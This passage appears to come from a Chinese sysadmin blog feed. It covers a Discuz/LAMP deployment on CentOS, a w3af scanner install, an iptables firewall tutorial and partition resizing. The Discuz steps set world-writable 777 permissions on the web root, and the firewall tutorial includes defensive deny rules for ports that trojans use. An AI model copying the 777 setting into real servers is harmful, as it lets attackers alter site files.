href="https://cloud.tencent.com/developer/labs/lab/10030#stage-1-step-1-password" target="_blank" rel="noopener">?</a>]，参考下面的内容：</p><pre><code>/usr/bin/mysqladmin -u root password 'Password'</code></pre><p>将 MySQL 设置为开机自动启动：</p><pre><code>chkconfig mysqld on</code></pre><blockquote><p>下面命令中的密码是教程为您自动生成的，为了方便实验的进行，不建议使用其它密码。如果设置其它密码，请把密码记住，在后续的步骤会使用到。</p></blockquote><h3 id="1x02安装-Apache-组件"><a href="#1x02安装-Apache-组件" class="headerlink" title="1x02安装 Apache 组件"></a>1x02安装 Apache 组件</h3><p>使用 <code>yum</code> 安装 Apache 组件：</p><pre><code>yum install httpd -y</code></pre><p>安装之后，启动 httpd 进程：</p><pre><code>service httpd start</code></pre><p>把 httpd 也设置成开机自动启动：</p><pre><code>chkconfig httpd on</code></pre><h3 id="1x03安装-PHP"><a href="#1x03安装-PHP" class="headerlink" title="1x03安装 PHP"></a>1x03安装 PHP</h3><p>使用 <code>yum</code> 安装 PHP：[<a href="https://cloud.tencent.com/developer/labs/lab/10030#stage-1-step-3-php" target="_blank" rel="noopener">?</a>]</p><pre><code>yum install php php-fpm php-mysql -y</code></pre><p>安装之后，启动 PHP-FPM 进程：</p><pre><code>service php-fpm start</code></pre><p>启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口 [<a href="https://cloud.tencent.com/developer/labs/lab/10030#stage-1-step-3-port" target="_blank" rel="noopener">?</a>]</p><pre><code>netstat -nlpt | grep php-fpm</code></pre><p>把 PHP-FPM 也设置成开机自动启动：</p><pre><code>chkconfig php-fpm on</code></pre><blockquote><p>CentOS 6 默认已经安装了 PHP-FPM 及 PHP-MYSQL，下面命令执行的可能会提示已经安装。</p></blockquote><blockquote><p>PHP-FPM 默认监听 9000 端口</p></blockquote><h2 id="1x10安装并配置-Discuz"><a href="#1x10安装并配置-Discuz" class="headerlink" title="1x10安装并配置 Discuz"></a>1x10安装并配置 Discuz</h2><blockquote><p>任务时间：15min ~ 30min</p></blockquote><h3 id="1x11安装-Discuz"><a href="#1x11安装-Discuz" class="headerlink" title="1x11安装 Discuz"></a>1x11安装 Discuz</h3><p>CentOS 6 没有Discuz 的 <code>yum</code> 源，所以我们需要下载一个Discuz 压缩包：[<a href="https://cloud.tencent.com/developer/labs/lab/10030#stage-2-step-1-discuz" target="_blank" rel="noopener">?</a>]</p><pre><code>wget http://download.comsenz.com/DiscuzX/3.2/Discuz_X3.2_SC_UTF8.zip</code></pre><p>下载完成后，解压这个压缩包</p><pre><code>unzip Discuz_X3.2_SC_UTF8.zip</code></pre><p>解压完后，就能在 <em>upload</em> 文件夹里看到discuz的源码了</p><blockquote><p>到Discuz官网找一个安装包并复制安装包下载路径，这里我们用 Discuz_X3.2_SC_UTF8.zip</p></blockquote><h3 id="1x12配置-Discuz"><a href="#1x12配置-Discuz" class="headerlink" title="1x12配置 Discuz"></a>1x12配置 Discuz</h3><p>由于PHP默认访问 <code>/var/www/html/</code> 文件夹，所以我们需要把upload文件夹里的文件都复制到 <code>/var/www/html/</code> 文件夹</p><pre><code>cp -r upload/* /var/www/html/</code></pre><p>给 /var/www/html 目录及其子目录赋予权限</p><pre><code>chmod -R 777 /var/www/html</code></pre><p>重启 Apache</p><pre><code>service httpd restart</code></pre><h2 id="1x20准备域名和证书"><a href="#1x20准备域名和证书" class="headerlink" title="1x20准备域名和证书"></a>1x20准备域名和证书</h2><blockquote><p>任务时间：15min ~ 30min</p></blockquote><h3 id="1x21域名注册"><a href="#1x21域名注册" class="headerlink" title="1x21域名注册"></a>1x21域名注册</h3><p>如果您还没有域名，可以<a href="https://dnspod.qcloud.com/?fromSource=lab" target="_blank" rel="noopener">在腾讯云上选购</a>，过程可以参考下面的视频。</p><ul><li><em>视频 - 在腾讯云上购买域名</em></li></ul><h3 id="1x22域名解析"><a href="#1x22域名解析" class="headerlink" title="1x22域名解析"></a>1x22域名解析</h3><p>域名购买完成后, 需要将域名解析到实验云主机上，实验云主机的 IP 为：</p><pre><code>&lt;您的 CVM IP 地址&gt;</code></pre><p>在腾讯云购买的域名，可以<a href="https://console.qcloud.com/domain" target="_blank" rel="noopener">到控制台添加解析记录</a>，过程可参考下面的视频：</p><ul><li><em>视频 - 如何在腾讯云上解析域名</em></li></ul><p>域名设置解析后需要过一段时间才会生效，通过 <code>ping</code> 命令检查域名是否生效 [<a href="https://cloud.tencent.com/developer/labs/lab/10030#stage-3-step-2-replace" target="_blank" rel="noopener">?</a>]，如：</p><pre><code>ping www.yourdomain.com</code></pre><p>如果 ping 命令返回的信息中含有你设置的解析的 IP 地址，说明解析成功。</p><blockquote><p>注意替换下面命令中的 <code>www.yourmpdomain.com</code> 为您自己的注册的域名</p></blockquote><h3 id="1x30大功告成！"><a href="#1x30大功告成！" class="headerlink" title="1x30大功告成！"></a>1x30大功告成！</h3><p>恭喜，您的 Discuz 论坛已经部署完成，您可以通过浏览器访问论坛查看效果。</p><p>通过IP地址查看：[http://&lt;您的 CVM IP 地址&gt;/install](<a href="http://xn--" target="_blank" rel="noopener">http://xn--</a>&lt; cvm ip &gt;-yp49ackh32qjw5g/install)</p><p>通过域名查看：<a href="http://www.yourdomain.com/install，其中替换" target="_blank" rel="noopener">http://www.yourdomain.com/install，其中替换</a> <code>www.yourdomain.com</code> 为之前申请的域名。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 腾讯云开发者实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基于CentOS搭建web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>w3af的安装</title>
      <link href="/2019/09/05/w3af-de-an-zhuang/"/>
      <url>/2019/09/05/w3af-de-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00安装"><a href="#0x00安装" class="headerlink" title="0x00安装"></a>0x00安装</h2><h3 id="0x01-w3af-console"><a href="#0x01-w3af-console" class="headerlink" title="0x01 w3af_console"></a>0x01 w3af_console</h3><pre class="line-numbers language-bash"><code class="language-bash">proxychains <span class="token function">git</span> clone https://github.com/andresriancho/w3af.git./w3af_consoleproxychains <span class="token function">apt-get</span> build-dep python-lxml<span class="token function">cd</span> /tmpproxychains ./w3af_dependency_install.sh proxychains <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">npm</span> <span class="token operator">&amp;&amp;</span> <span class="token function">npm</span> -g <span class="token function">install</span> retire<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0-x02-w3af-gui"><a href="#0-x02-w3af-gui" class="headerlink" title="0.x02 w3af_gui"></a>0.x02 w3af_gui</h3><pre class="line-numbers language-bash"><code class="language-bash">proxychains ./w3af_gui<span class="token function">cd</span> /tmpproxychains ./w3af_dependency_install.shproxychains pip <span class="token function">install</span> xdot<span class="token operator">==</span>0.6./w3af_gui<span class="token comment" spellcheck="true">#提示no module named webkit</span><span class="token comment" spellcheck="true">#下载依赖</span>proxychains <span class="token function">wget</span> http://ftp.br.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.debproxychains <span class="token function">wget</span> http://ftp.br.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb<span class="token function">wget</span> http://ftp.cn.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit-dev_1.1.8-3_all.debdpkg -i python-support_1.0.15_all.debdpkg -i python-webkit_1.1.8-3_amd64.deb<span class="token comment" spellcheck="true">#提示缺少依赖libpango1.0-0 (>= 1.14.0) libwebkitgtk-1.0-0 (>= 1.3.10)</span>proxychains <span class="token function">wget</span> http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libwebkitgtk-1.0-0_2.4.11-3_amd64.deb proxychains <span class="token function">wget</span> http://ftp.debian.org/debian/pool/main/p/pango1.0/libpango1.0-0_1.42.4-7_amd64.debdpkg -i libwebkitgtk-1.0-0_2.4.11-3_amd64.deb<span class="token comment" spellcheck="true">#提示缺少libicu57：</span>proxychains <span class="token function">wget</span> http://ftp.de.debian.org/debian/pool/main/i/icu/libicu57_57.1-6+deb9u2_amd64.debdpkg -i libicu57_57.1-6+deb9u2_amd64.debdpkg -i libwebkitgtk-1.0-0_2.4.11-3_amd64.deb<span class="token comment" spellcheck="true">#提示缺少依赖ibjavascriptcoregtk-1.0-0 (= 2.4.11-3)</span>proxychains <span class="token function">wget</span> http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libjavascriptcoregtk-1.0-0_2.4.11-3_amd64.debdpkg -i libjavascriptcoregtk-1.0-0_2.4.11-3_amd64.debdpkg -i libwebkitgtk-1.0-0_2.4.11-3_amd64.deb<span class="token comment" spellcheck="true">#提示缺少依赖libegl1-mesa (>= 7.8.1) </span>proxychains <span class="token function">apt-get</span> <span class="token function">install</span> --fix-broken将会同时安装下列软件：  libegl1-mesa libpango1.0-0 libpangox-1.0-0下列【新】软件包将被安装：  libegl1-mesa libpango1.0-0 libpangox-1.0-0dpkg -i libwebkitgtk-1.0-0_2.4.11-3_amd64.debdpkg -i python-webkit_1.1.8-3_amd64.debdpkg -i python-webkit-dev_1.1.8-3_all.deb./w3af_gui<span class="token comment" spellcheck="true">#成功安装基于Kali 2019.2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-PATH"><a href="#0x03-PATH" class="headerlink" title="0x03 $PATH"></a>0x03 $PATH</h3><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/profile在最后，添加:<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token string">"/root/w3af:<span class="token variable">$PATH</span>"</span>保存，退出，然后运行：<span class="token function">source</span> /etc/profile<span class="token comment" spellcheck="true">#多条环境变量</span><span class="token function">export</span> PATH<span class="token operator">=</span><span class="token string">"/root/w3af:/root/vega:<span class="token variable">$PATH</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> w3af </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 扫描神器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux下IPTABLES配置</title>
      <link href="/2019/09/05/linux-xia-iptables-pei-zhi/"/>
      <url>/2019/09/05/linux-xia-iptables-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h3 id="linux下IPTABLES配置详解"><a href="#linux下IPTABLES配置详解" class="headerlink" title="linux下IPTABLES配置详解"></a>linux下IPTABLES配置详解</h3><p><strong>-A RH-Firewall-1-INPUT -p tcp -m state –state NEW -m tcp –dport 24000 -j ACCEPT-A RH-Firewall-1-INPUT -s 121.10.120.24 -p tcp -m tcp –dport 18612 -j ACCEPT</strong></p><p><strong>如果你的IPTABLES基础知识还不了解,建议先去看看.</strong></p><p><strong>开始配置</strong></p><p><strong>我们来配置一个filter表的防火墙.</strong></p><p><strong>(1)查看本机关于IPTABLES的设置情况</strong></p><p>[root@tp ~]# iptables -L -n<br>Chain INPUT (policy ACCEPT)<br>target     prot opt source               destination        </p><p>Chain FORWARD (policy ACCEPT)<br>target     prot opt source               destination        </p><p>Chain OUTPUT (policy ACCEPT)<br>target     prot opt source               destination        </p><p>Chain RH-Firewall-1-INPUT (0 references)<br>target     prot opt source               destination<br>ACCEPT     all  –  0.0.0.0/0            0.0.0.0/0<br>ACCEPT     icmp –  0.0.0.0/0            0.0.0.0/0           icmp type 255<br>ACCEPT     esp  –  0.0.0.0/0            0.0.0.0/0<br>ACCEPT     ah   –  0.0.0.0/0            0.0.0.0/0<br>ACCEPT     udp  –  0.0.0.0/0            224.0.0.251         udp dpt:5353<br>ACCEPT     udp  –  0.0.0.0/0            0.0.0.0/0           udp dpt:631<br>ACCEPT     all  –  0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED<br>ACCEPT     tcp  –  0.0.0.0/0            0.0.0.0/0           state NEW tcp dpt:22<br>ACCEPT     tcp  –  0.0.0.0/0            0.0.0.0/0           state NEW tcp dpt:80<br>ACCEPT     tcp  –  0.0.0.0/0            0.0.0.0/0           state NEW tcp dpt:25<br>REJECT     all  –  0.0.0.0/0            0.0.0.0/0           reject-with icmp-host-prohibited<br>可以看出我在安装linux时,选择了有防火墙,并且开放了22,80,25端口.</p><p>如果你在安装linux时没有选择启动防火墙,是这样的</p><p>[root@tp ~]# iptables -L -n<br>Chain INPUT (policy ACCEPT)<br>target     prot opt source               destination        </p><p>Chain FORWARD (policy ACCEPT)<br>target     prot opt source               destination        </p><p>Chain OUTPUT (policy ACCEPT)<br>target     prot opt source               destination  </p><p>什么规则都没有.</p><p><strong>(2)清除原有规则.</strong></p><p>不管你在安装linux时是否启动了防火墙,如果你想配置属于自己的防火墙,那就清除现在filter的所有规则.</p><p>[root@tp ~]# iptables -F      清除预设表filter中的所有规则链的规则<br>[root@tp ~]# iptables -X      清除预设表filter中使用者自定链中的规则</p><p>我们在来看一下</p><p>[root@tp ~]# iptables -L -n<br>Chain INPUT (policy ACCEPT)<br>target     prot opt source               destination        </p><p>Chain FORWARD (policy ACCEPT)<br>target     prot opt source               destination        </p><p>Chain OUTPUT (policy ACCEPT)<br>target     prot opt source               destination     </p><p>什么都没有了吧,和我们在安装linux时没有启动防火墙是一样的.(提前说一句,这些配置就像用命令配置IP一样,重起就会失去作用),怎么保存.</p><p>[root@tp ~]# /etc/rc.d/init.d/iptables save</p><p>这样就可以写到/etc/sysconfig/iptables文件里了.写入后记得把防火墙重起一下,才能起作用.</p><p>[root@tp ~]# service iptables restart</p><p>现在IPTABLES配置表里什么配置都没有了,那我们开始我们的配置吧</p><p><strong>(3)设定预设规则</strong></p><p>[root@tp ~]# iptables -P INPUT DROP</p><p>[root@tp ~]# iptables -P OUTPUT ACCEPT</p><p>[root@tp ~]# iptables -P FORWARD DROP<br><strong>上面的意思是,当超出了IPTABLES里filter表里的两个链规则(INPUT,FORWARD)时,不在这两个规则里的数据包怎么处理呢,那就是DROP(放弃).应该说这样配置是很安全的.我们要控制流入数据包</strong></p><p><strong>而对于OUTPUT链,也就是流出的包我们不用做太多限制,而是采取ACCEPT,也就是说,不在着个规则里的包怎么办呢,那就是通过.</strong></p><p><strong>可以看出INPUT,FORWARD两个链采用的是允许什么包通过,而OUTPUT链采用的是不允许什么包通过.</strong></p><p><strong>这样设置还是挺合理的,当然你也可以三个链都DROP,但这样做我认为是没有必要的,而且要写的规则就会增加.但如果你只想要有限的几个规则是,如只做WEB服务器.还是推荐三个链都是DROP.</strong></p><p>注:如果你是远程SSH登陆的话,当你输入第一个命令回车的时候就应该掉了.因为你没有设置任何规则.</p><p>怎么办,去本机操作呗!</p><p><strong>(4)添加规则.</strong></p><p><strong>首先添加INPUT链,INPUT链的默认规则是DROP,所以我们就写需要ACCETP(通过)的链</strong></p><p><strong>为了能采用远程SSH登陆,我们要开启22端口.</strong></p><p>[root@tp ~]# iptables -A INPUT -p tcp –dport 22 -j ACCEPT</p><p>[root@tp ~]# iptables -A OUTPUT -p tcp –sport 22 -j ACCEPT <strong>(注:这个规则,如果你把OUTPUT 设置成DROP的就要写上这一部,好多人都是望了写这一部规则导致,始终无法SSH.在远程一下,是不是好了.</strong></p><p><strong>其他的端口也一样,如果开启了web服务器,OUTPUT设置成DROP的话,同样也要添加一条链:</strong></p><p>[root@tp ~]# iptables -A OUTPUT -p tcp –sport 80 -j ACCEPT ,其他同理.)</p><p><strong>如果做了WEB服务器,开启80端口.</strong></p><p>[root@tp ~]# iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br><strong>如果做了邮件服务器,开启25,110端口.</strong></p><p>[root@tp ~]# iptables -A INPUT -p tcp –dport 110 -j ACCEPT<br>[root@tp ~]# iptables -A INPUT -p tcp –dport 25 -j ACCEPT<br><strong>如果做了FTP服务器,开启21端口</strong></p><p>[root@tp ~]# iptables -A INPUT -p tcp –dport 21 -j ACCEPT</p><p>[root@tp ~]# iptables -A INPUT -p tcp –dport 20 -j ACCEPT</p><p><strong>如果做了DNS服务器,开启53端口</strong></p><p>[root@tp ~]# iptables -A INPUT -p tcp –dport 53 -j ACCEPT</p><p>如果你还做了其他的服务器,需要开启哪个端口,照写就行了.</p><p>上面主要写的都是INPUT链,凡是不在上面的规则里的,都DROP</p><p><strong>允许icmp包通过,也就是允许ping,</strong></p><p>[root@tp ~]# iptables -A OUTPUT -p icmp -j ACCEPT (OUTPUT设置成DROP的话)</p><p>[root@tp ~]# iptables -A INPUT -p icmp -j ACCEPT  (INPUT设置成DROP的话)</p><p><strong>允许loopback!(不然会导致DNS无法正常关闭等问题)</strong></p><p>IPTABLES -A INPUT -i lo -p all -j ACCEPT (如果是INPUT DROP)<br>IPTABLES -A OUTPUT -o lo -p all -j ACCEPT(如果是OUTPUT DROP)</p><p>下面写OUTPUT链,OUTPUT链默认规则是ACCEPT,所以我们就写需要DROP(放弃)的链.</p><p><strong>减少不安全的端口连接</strong></p><p>[root@tp ~]# iptables -A OUTPUT -p tcp –sport 31337 -j DROP</p><p>[root@tp ~]# iptables -A OUTPUT -p tcp –dport 31337 -j DROP</p><p>有些些特洛伊木马会扫描端口31337到31340(即黑客语言中的 elite 端口)上的服务。既然合法服务都不使用这些非标准端口来通信,阻塞这些端口能够有效地减少你的网络上可能被感染的机器和它们的远程主服务器进行独立通信的机会</p><p>还有其他端口也一样,像:31335、27444、27665、20034 NetBus、9704、137-139（smb）,2049(NFS)端口也应被禁止,我在这写的也不全,有兴趣的朋友应该去查一下相关资料.</p><p><strong>当然出入更安全的考虑你也可以包OUTPUT链设置成DROP,那你添加的规则就多一些,就像上边添加</strong></p><p><strong>允许SSH登陆一样.照着写就行了.</strong></p><p><strong>下面写一下更加细致的规则,就是限制到某台机器</strong></p><p><strong>如:我们只允许192.168.0.3的机器进行SSH连接</strong></p><p>[root@tp ~]# iptables -A INPUT -s 192.168.0.3 -p tcp –dport 22 -j ACCEPT</p><p>如果要允许,或限制一段IP地址可用 192.168.0.0/24 表示192.168.0.1-255端的所有IP.</p><p>24表示子网掩码数.但要记得把 /etc/sysconfig/iptables 里的这一行删了.</p><p>-A INPUT -p tcp -m tcp –dport 22 -j ACCEPT 因为它表示所有地址都可以登陆.</p><p>或采用命令方式:</p><p>[root@tp ~]# iptables -D INPUT -p tcp –dport 22 -j ACCEPT</p><p>然后保存,我再说一边,反是采用命令的方式,只在当时生效,如果想要重起后也起作用,那就要保存.写入到/etc/sysconfig/iptables文件里.</p><p>[root@tp ~]# /etc/rc.d/init.d/iptables save</p><p>这样写 !192.168.0.3 表示除了192.168.0.3的ip地址</p><p>其他的规则连接也一样这么设置.</p><p><strong>在下面就是FORWARD链,FORWARD链的默认规则是DROP,所以我们就写需要ACCETP(通过)的链,对正在转发链的监控.</strong></p><p><strong>开启转发功能,(在做NAT时,FORWARD默认规则是DROP时,必须做)</strong></p><p>[root@tp ~]# iptables -A FORWARD -i eth0 -o eth1 -m state –state RELATED,ESTABLISHED -j ACCEPT</p><p>[root@tp ~]# iptables -A FORWARD -i eth1 -o eh0 -j ACCEPT</p><p><strong>丢弃坏的TCP包</strong></p><p>[root@tp ~]#iptables -A FORWARD -p TCP ! –syn -m state –state NEW -j DROP</p><p><strong>处理IP碎片数量,防止攻击,允许每秒100个</strong></p><p>[root@tp ~]#iptables -A FORWARD -f -m limit –limit 100/s –limit-burst 100 -j ACCEPT</p><p><strong>设置ICMP包过滤,允许每秒1个包,限制触发条件是10个包.</strong></p><p>[root@tp ~]#iptables -A FORWARD -p icmp -m limit –limit 1/s –limit-burst 10 -j ACCEPT</p><p>我在前面只所以允许ICMP包通过,就是因为我在这里有限制.</p><p><strong>二,配置一个NAT表放火墙</strong></p><p><strong>1,查看本机关于NAT的设置情况</strong></p><p><strong>[root@tp rc.d]# iptables -t nat -L</strong><br>Chain PREROUTING (policy ACCEPT)<br>target     prot opt source               destination        </p><p>Chain POSTROUTING (policy ACCEPT)<br>target     prot opt source               destination<br>SNAT       all  –  192.168.0.0/24       anywhere            to:211.101.46.235</p><p>Chain OUTPUT (policy ACCEPT)<br>target     prot opt source               destination   </p><p>我的NAT已经配置好了的(只是提供最简单的代理上网功能,还没有添加防火墙规则).关于怎么配置NAT,参考我的另一篇文章</p><p>当然你如果还没有配置NAT的话,你也不用清除规则,因为NAT在默认情况下是什么都没有的</p><p><strong>如果你想清除,命令是</strong></p><p>[root@tp ~]# iptables -F -t nat</p><p>[root@tp ~]# iptables -X -t nat</p><p>[root@tp ~]# iptables -Z -t nat</p><p><strong>2,添加规则</strong></p><p><strong>添加基本的NAT地址转换,(关于如何配置NAT可以看我的另一篇文章),</strong></p><p><strong>添加规则,我们只添加DROP链.因为默认链全是ACCEPT.</strong></p><p><strong>防止外网用内网IP欺骗</strong></p><p>[root@tp sysconfig]# iptables -t nat -A PREROUTING -i eth0 -s 10.0.0.0/8 -j DROP<br>[root@tp sysconfig]# iptables -t nat -A PREROUTING -i eth0 -s 172.16.0.0/12 -j DROP<br>[root@tp sysconfig]# iptables -t nat -A PREROUTING -i eth0 -s 192.168.0.0/16 -j DROP<br> <strong>如果我们想,比如阻止MSN,QQ,BT等的话,需要找到它们所用的端口或者IP,(个人认为没有太大必要)</strong></p><p><strong>例：</strong></p><p><strong>禁止与211.101.46.253的所有连接</strong></p><p> [root@tp ~]# iptables -t nat -A PREROUTING  -d 211.101.46.253 -j DROP</p><p><strong>禁用FTP(21)端口</strong> </p><p>[root@tp ~]# iptables -t nat -A PREROUTING -p tcp –dport 21 -j DROP</p><p><strong>这样写范围太大了,我们可以更精确的定义.</strong></p><p>[root@tp ~]# iptables -t nat -A PREROUTING  -p tcp –dport 21 -d 211.101.46.253 -j DROP</p><p><strong>这样只禁用211.101.46.253地址的FTP连接,其他连接还可以.如web(80端口)连接.</strong></p><p><strong>按照我写的,你只要找到QQ,MSN等其他软件的IP地址,和端口,以及基于什么协议,只要照着写就行了.</strong></p><p><strong>最后：</strong></p><p><strong>drop非法连接</strong><br>[root@tp ~]# iptables -A INPUT   -m state –state INVALID -j DROP<br>[root@tp ~]# iptables -A OUTPUT  -m state –state INVALID -j DROP<br>[root@tp ~]# iptables-A FORWARD -m state –state INVALID -j DROP<br><strong>允许所有已经建立的和相关的连接</strong><br>[root@tp ~]# iptables-A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT<br>[root@tp ~]# iptables-A OUTPUT -m state –state ESTABLISHED,RELATED -j ACCEPT</p><p>[root@tp ~]# /etc/rc.d/init.d/iptables save</p><p><strong>这样就可以写到/etc/sysconfig/iptables文件里了.写入后记得把防火墙重起一下,才能起作用．</strong></p><p>[root@tp ~]# service iptables restart</p><p><strong>别忘了保存，不行就写一部保存一次．你可以一边保存，一边做实验，看看是否达到你的要求，</strong> </p><p><strong>写这篇文章，用了我将近１个月的时间．查找资料，自己做实验，希望对大家有所帮助．如有不全及不完善的地方还请提出.</strong></p><p><strong>因为本篇文章以配置为主.关于IPTABLES的基础知识及指令命令说明等我会尽快传上,当然你可以去网上搜索一下,还是很多的.</strong></p><p>Linux防火墙iptables学习笔记</p><p>一、概要<br>1、防火墙分类<br>      ①包过滤防火墙(pack filtering)在网络层对数据包进行选择过滤，采用访问控制列表(Access control table－ACL)检查数据流的源地址，目的地址，源和目的端口，IP等信息。<br>      ②代理服务器型防火墙<br>2、iptables基础<br>      ①规则(rules)：网络管理员预定义的条件<br>      ②链(chains)： 是数据包传播的路径<br>      ③表(tables)：内置3个表filter表，nat表，mangle表分别用于实现包过滤网络地址转换和包重构的功能<br>      ④filter表是系统默认的，INPUT表(进入的包)，FORWORD(转发的包)，OUTPUT(处理本地生成的包)，filter表只能对包进行授受和丢弃的操作。<br>      ⑤nat表(网络地址转换)，PREROUTING(修改即将到来的数据包)，OUTPUT(修改在路由之前本地生成的数据包)，POSTROUTING(修改即将出去的数据包)<br>      ⑥mangle表，PREROUTING，OUTPUT，FORWORD，POSTROUTING，INPUT<br>3、其它<br>   iptables是按照顺序读取规则<br>   防火墙规则的配置建议<br>    Ⅰ 规则力求简单<br>    Ⅱ 规则的顺序很重要<br>    Ⅲ 尽量优化规则<br>    Ⅳ 做好笔记<br>二、配置<br>1、iptables命令格式<br>     iptables [-t 表] －命令 匹配 操作 （大小写敏感）<br>   动作选项<br>     ACCEPT          接收数据包<br>     DROP             丢弃数据包<br>     REDIRECT      将数据包重新转向到本机或另一台主机的某一个端口，通常功能实现透明代理或对外开放内网的某些服务<br>     SNAT             源地址转换<br>     DNAT             目的地址转换<br>     MASQUERADE       IP伪装<br>     LOG               日志功能<br>2、定义规则<br>   ①先拒绝所有的数据包，然后再允许需要的数据包<br>      iptalbes -P INPUT DROP<br>      iptables -P FORWARD DROP<br>      iptables -P OUTPUT ACCEPT<br>   ②查看nat表所有链的规则列表<br>      iptables -t nat -L<br>   ③增加，插入，删除和替换规则<br>     iptables [-t 表名] &lt;-A|I|D|R&gt; 链名 [规则编号] [-i|o 网卡名称] [-p 协议类型] [-s 源ip|源子网] [–sport 源端口号] [-d 目的IP|目标子网] [–dport 目标端口号] [-j 动作]<br>    参数：-A 增加<br>               -I 插入<br>               -D 删除<br>               -R 替换</p><p>三、例子<br>①iptables -t filter -A INPUT -s 192.168.1.5 -i eth0 -j DROP<br>禁止IP为192.168.1.5的主机从eth0访问本机②iptables -t filter -I INPUT 2 -s 192.168.5.0/24 -p tcp –dport 80 -j DROP<br>禁止子网192.168.5.0访问web服务③iptables -t filter -I INPUT 2 -s 192.168.7.9 -p tcp –dport ftp -j DROP<br>禁止IP为192.168.7.9访问FTP服务<br>④iptables -t filter -L INPUT<br>查看filter表中INPUT链的规则<br>⑤iptables -t nat -F<br>删除nat表中的所有规则<br>⑥iptables -I FORWARD -d <a href="http://www.playboy.com" target="_blank" rel="noopener">www.playboy.com</a> -j DROP<br>禁止访问<a href="http://www.playboy.com网站" target="_blank" rel="noopener">www.playboy.com网站</a><br>⑦iptables -I FORWARD -s 192.168.5.23 -j DROP<br>禁止192.168.5.23上网</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 防火墙 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>扩展分区和文件系统统—_linux系统盘</title>
      <link href="/2019/09/05/kuo-zhan-fen-qu-he-wen-jian-xi-tong-tong-linux-xi-tong-pan/"/>
      <url>/2019/09/05/kuo-zhan-fen-qu-he-wen-jian-xi-tong-tong-linux-xi-tong-pan/</url>
      
        <content type="html"><![CDATA[<p>本文提供了如何使用growpart和resize2fs工具完成Linux系统盘分区扩容及文件系统扩展的操作指导。</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ol><li><p>创建快照以备份数据，防止操作失误导致数据丢失。</p></li><li><p>根据操作系统安装growpart或者xfsprogs扩容格式化工具。</p><ul><li>CentOS 7、Aliyun Linux：</li></ul></li></ol><pre><code> ``` yum install cloud-utils-growpart yum install xfsprogs ```</code></pre><ul><li>Ubuntu 14、Ubuntu 16、Ubuntu 18、Debian 9：</li></ul><pre><code> ``` apt install cloud-guest-utils apt install xfsprogs ```</code></pre><ul><li>Debian 8、OpenSUSE 42.3、OpenSUSE 13.1、SUSE Linux Enterprise Server 12 SP2：请使用上游版本（upstream）的growpart或者xfsprogs工具</li></ul><p>   <strong>说明</strong> 当出现因扩容格式化工具问题导致的扩容失败时，您可以卸载工具后重新安装。</p><ol start="3"><li><p>检查实例的内核版本，例如运行</p><pre><code>uname -a</code></pre><p>命令查看内核版本。</p><ul><li>内核版本大于3.6.0，该情况请参见[高内核版本的操作步骤。</li><li>内核版本小于3.6.0，该情况请参见低内核版本的操作步骤。如CentOS 6、Debian 7和SUSE Linux Enterprise Server 11 SP4等发行版，需要经过一次控制台重启或者API重启才能完成分区扩容。</li></ul></li></ol><h2 id="背景信息"><a href="#背景信息" class="headerlink" title="背景信息"></a>背景信息</h2><p>本文的操作步骤适用于以下分区和文件系统格式的云盘：</p><ul><li>分区格式支持mbr、gpt</li><li>文件系统支持ext*、xfs、btrfs</li></ul><h2 id="扩展高内核版本实例的系统盘分区和文件系统"><a href="#扩展高内核版本实例的系统盘分区和文件系统" class="headerlink" title="扩展高内核版本实例的系统盘分区和文件系统"></a>扩展高内核版本实例的系统盘分区和文件系统</h2><p>此处以CentOS 7操作系统为例演示分区扩展的步骤。</p><ol><li><p>运行<code>fdisk 